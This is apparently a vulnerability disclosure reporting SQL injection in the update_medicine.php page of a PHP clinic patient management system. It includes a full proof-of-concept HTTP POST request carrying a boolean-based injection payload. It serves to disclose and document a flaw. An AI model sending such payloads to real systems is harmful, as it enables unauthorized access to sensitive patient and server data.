## Clinic's Patient Management System has SQL injection vulnerability

## submitter
zhangMingMing

## supplier
https://www.sourcecodester.com/php-clinics-patient-management-system-source-code
## Vulnerability file
/pms/update_medicine.php
## describe
An unrestricted SQL injection attack exists in an inventory management system. The parameters that can be controlled are as follows: hidden_id. This function executes the hidden_id parameter into the SQL statement without any restrictions. A malicious attacker could exploit this vulnerability to obtain sensitive information in the server database.
## code analysis
The hidden_id parameter in update_medicine.php is controlled and is directly carried into the SQL statement for execution, resulting in SQL injection.

<img width="1324" alt="image" src="https://github.com/user-attachments/assets/71c05e69-76d5-4f5b-8c73-287da49f57a0">


Injection via parameter hidden_id
POC
```
POST /pms/update_medicine.php?id=257 HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 88
Origin: http://localhost
Connection: close
Referer: http://localhost/pms/update_medicine.php?id=257
Cookie: PHPSESSID=cims89c5nt143re39d3ce6cdvd
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1

hidden_id=257*&medicine_name=22%29+And+Elt%289381%3D3558%2C3558%29--+Sdff&save_medicine=
```

<img width="1700" alt="image" src="https://github.com/user-attachments/assets/85ba5eb4-21ce-458d-bbda-c2441b096020">

<img width="1087" alt="image" src="https://github.com/user-attachments/assets/044cca9f-e132-48be-9bdc-3775cf8613fb">









